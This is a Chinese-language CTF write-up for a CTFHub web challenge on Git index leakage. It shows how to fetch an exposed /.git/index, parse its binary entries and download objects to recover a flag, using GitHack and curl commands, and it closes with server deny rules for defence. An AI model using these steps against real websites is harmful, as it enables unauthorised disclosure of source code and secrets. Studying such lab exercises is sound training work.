---
layout: post
title: CTFHub - Git 泄露 Index Writeup
platform: ctfhub
date: 2026-10-16 10:22:00 +0800
categories: CTF
---

CTFHub - Git 泄露 Index Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → 信息泄露 → Git 泄露 → **Index**）
- 题型：Web
- 考点：**`.git/index`（暂存区）解析**、Git 二进制文件格式

```text
首页提示     : CTFHub .git leakage —— "Where is flag?"
探测结果     : /.git/HEAD     → 200（23 字节）
              /.git/index    → 200（305 字节）  ★ 本题入口（Index 题的特征）
              /.git/logs/HEAD → 200（294 字节）
              /.git/refs/stash → 404（没有 stash）

提交历史（.git/logs/HEAD）只有两次：
      init       ef3cfa0c...
      add flag   31612a69...

① 下载 .git/index（305 字节）
   前 4 字节: DIRC        ← git index 的魔数（DirC = directory cache）
   格式版本 : 2
   条目数量 : 3

② 解析出 3 个条目（暂存区里的文件）：
      [1] 50x.html                blob=9071e0a2...  size=494
      [2] 79812824226077.txt      blob=ab79d4d1...  size=33   ← ★ flag 在这里
      [3] index.html              blob=2c59e302...  size=143

③ 用条目的 blob SHA 从 .git/objects/ 取内容：
      ctfhub{8543d9aae1b40044b8320985}

flag         : ctfhub{8543d9aae1b40044b8320985}
```

二、题目分析

**① 先搞懂 Git 的三个"存放区"**

```text
Git 里，你的改动会经历三个阶段：

    ① 工作区（Working Directory）  —— 你正在编辑的文件
              ↓  git add
    ② 暂存区（Staging Area / Index）—— 准备提交的内容  ★ 本题看这里
              ↓  git commit
    ③ 仓库（Repository / .git）    —— 已提交的历史

★ 暂存区就存在【.git/index】这个文件里（二进制的）。
```

**② `.git/index` 里有什么**

```text
它记录了"哪些文件已经被 git add 了"，每个条目包含：
    · 文件名
    · ★ 文件内容的 SHA（blob 对象的哈希）
    · 文件大小、修改时间、权限等元数据

★ 关键：有了 SHA，就能从 .git/objects/ 里把文件内容取出来 ——
  哪怕这个文件【从来没被 commit 过】。
```

**③ 为什么它能泄露 flag**

```text
开发者心态：
    "我只是 git add 了一下，还没 commit —— 应该不会被看到吧？"

真相：
    git add 会把文件内容【写进 .git/objects/】，
    并把记录写进【.git/index】。
    → 只要 .git 泄露，暂存区的内容就能被完整恢复
```

**④ 破题思路**

```text
① 确认 /.git/ 可访问，而且 /.git/index 存在
② 下载 .git/index（二进制）
③ 按 git index 的格式解析出：【文件名 + blob SHA】
④ 用 SHA 去 .git/objects/ 取文件内容
⑤ flag 就在里面
```

三、解题步骤

**方法一：用 GitHack（题目推荐，需 Python 2）**

```bash
git clone https://github.com/BugScanTeam/GitHack.git
cd GitHack
python2 GitHack.py http://challenge-xxx:10800/.git/

# 恢复出仓库后：
cd challenge-xxx_10800/
git diff --cached            # ★ 看暂存区和最后一次提交的差异
# 或者
cat 79812824226077.txt       # 直接看那个文件
```

**方法二：手工挖（理解格式，不需工具）**

**第 1 步：确认 index 存在**

```powershell
curl.exe -s -o NUL -w "%{http_code}`n" "http://challenge-xxx:10800/.git/index"
# 200 就是有
```

**第 2 步：下载 index 并看它的头部**

```powershell
curl.exe -s "http://challenge-xxx:10800/.git/index" -o index.bin
```

用十六进制看前 12 字节：

```text
44 49 52 43  00 00 00 02  00 00 00 03
└─────┬────┘  └────┬───┘  └────┬───┘
   "DIRC"       版本 = 2     条目数 = 3
  魔数
```

**第 3 步：按格式解析每个条目**

每个条目的结构（固定 62 字节 + 文件名）：

```text
偏移  长度  内容
  0    4    ctime 秒
  4    4    ctime 纳秒
  8    4    mtime 秒
 12    4    mtime 纳秒
 16    4    dev（设备号）
 20    4    ino（inode）
 24    4    ★ mode（文件权限，如 100644）
 28    4    uid
 32    4    gid
 36    4    ★ size（文件大小）
 40   20    ★ SHA-1（blob 对象的哈希）← 拿这个去取内容
 60    2    flags（低 12 位 = 文件名的长度）
 62  变长   ★ 文件名（以 \0 补齐到 8 字节边界）
```

**关键的两点**：
```text
· blob SHA 在偏移 40，占 20 字节
· 每个条目要【按 8 字节对齐】—— 算完长度后补 \0 到 8 的倍数（至少补 1 个）
  这一点最容易写错，不对齐就解析乱套
```

**第 4 步：用 SHA 取文件内容**

```text
blob SHA = ab79d4d1c077cfc4c540edcd2442f9bba19f422c
           └┬┘└──────────────────┬─────────────────┘
          前2位              后38位

下载地址：
http://challenge-xxx:10800/.git/objects/ab/79d4d1c077cfc4c540edcd2442f9bba19f422c

→ zlib 解压 → 
blob 33
ctfhub{8543d9aae1b40044b8320985}
```

**方法三：用我写的工具（纯 Python，双击即可）**

```text
双击 dump-git-index.bat
→ 粘贴题目根地址（结尾是 :10800 那一串）
→ 自动解析 index、取内容、搜 flag
```

**实测输出**：

```text
① 下载 .git/index
  ✔ 下载成功，大小 305 字节
     前 4 字节: b'DIRC'  (DIRC = git index 的魔数)

② 解析 index，列出暂存区里的文件
  格式版本: 2     条目数: 3

  [1] 50x.html
       blob SHA = 9071e0a24f654c88aa97a2273ca595e301b7ada5
       大小     = 494 字节
  [2] 79812824226077.txt
       blob SHA = ab79d4d1c077cfc4c540edcd2442f9bba19f422c
       大小     = 33 字节
       ★★★ 发现 flag: ctfhub{8543d9aae1b40044b8320985}
  [3] index.html
       blob SHA = 2c59e3024e3bc350976778204928a21d9ff42d01
       大小     = 143 字节
```

四、⭐ Git 泄露三兄弟总结（做完这三题就齐了）

| 子题 | 敏感内容在 | **入口文件** | 内容状态 | 网站上有吗 |
|---|---|---|---|---|
| **Log** | 历史提交 | `.git/logs/HEAD` | 曾 commit 过 | 可能有 |
| **Stash** | 暂存的改动 | `.git/refs/stash` | 从未 commit（stash 的） | **没有** |
| **Index** | 暂存区（add 未 commit） | **`.git/index`** | 从未 commit（add 的） | **没有** |

**三者的共同点**：

```text
★ 都是"顺藤摸瓜"：拿到一个 SHA → 拼出 .git/objects/ 地址 → 下载 → 解压
★ 最后都是同样的对象链：commit → tree → blob → 文件内容
```

**Git 对象路径规律（反复用到的核心）**：

```text
.git/objects/ + SHA前2位 + / + SHA后38位

例：ab79d4d1c077cfc4c540edcd2442f9bba19f422c
    → .git/objects/ab/79d4d1c077cfc4c540edcd2442f9bba19f422c
```

**一个重要的认知**：

```text
★ "没提交" ≠ "不会被看到"

    工作区的改动 → git add → 写进 .git/objects/ + .git/index
                            ↑ 到这一步，内容就已经在 .git 里了
    再 → git commit → 写进提交历史

    所以：
        git add 过的东西   → 在 .git/index 和 objects 里（Index 题）
        git stash 过的东西 → 在 .git/refs/stash 和 objects 里（Stash 题）
        git commit 过的东西 → 在 .git/logs/HEAD 和 objects 里（Log 题）

    只要 .git 泄露，这三种【全都能被挖出来】。
```

五、延伸知识

**① `.git/index` 的其它用途（实战）**

```text
· 它能告诉攻击者"开发者最近在改哪些文件"（mtime 时间戳）
· 能看出项目的目录结构
· 如果 index 里有 .env、config.php 这类文件 → 说明这些敏感文件存在
· git diff --cached 就是拿 index 和 HEAD 对比
```

**② 手动用 git 命令看暂存区**

```bash
git ls-files --stage          # 列出暂存区所有文件 + 它们的 blob SHA
git diff --cached             # 暂存区 vs 最后一次提交的差异
git show :filename            # 看暂存区里某个文件的内容
git cat-file -p <sha>         # 看任意对象的内容
```

**③ 相关的其它位置**

```text
.git/index              暂存区（本题）
.git/COMMIT_EDITMSG     最后一次提交时写的说明
.git/ORIG_HEAD          危险操作前的指针
.git/FETCH_HEAD         最后一次 fetch 的信息
.git/MERGE_HEAD         合并时的对方提交
```

**④ 防护**

```text
· 部署时不要把 .git 传到 web 目录（git archive 导出干净副本 / rsync 排除 .git）
· 服务器拒绝访问：
      Nginx:  location ~ /\.git { deny all; }
      Apache: <DirectoryMatch "/\.git"> Require all denied </DirectoryMatch>
· ★ 敏感信息不要"add 一下试试" —— git add 就已经写进 .git 了
```

**配套文件**（都在工作区）：

```text
git_index_dump.py     解析 .git/index 的工具（纯 Python，处理 8 字节对齐）
dump-git-index.bat    双击启动器
dump-git-all.bat      ★ 一键把 Log / Stash / Index 三种都试一遍（推荐）
git_leak_dump.py      Log 题工具
git_stash_dump.py     Stash 题工具
```
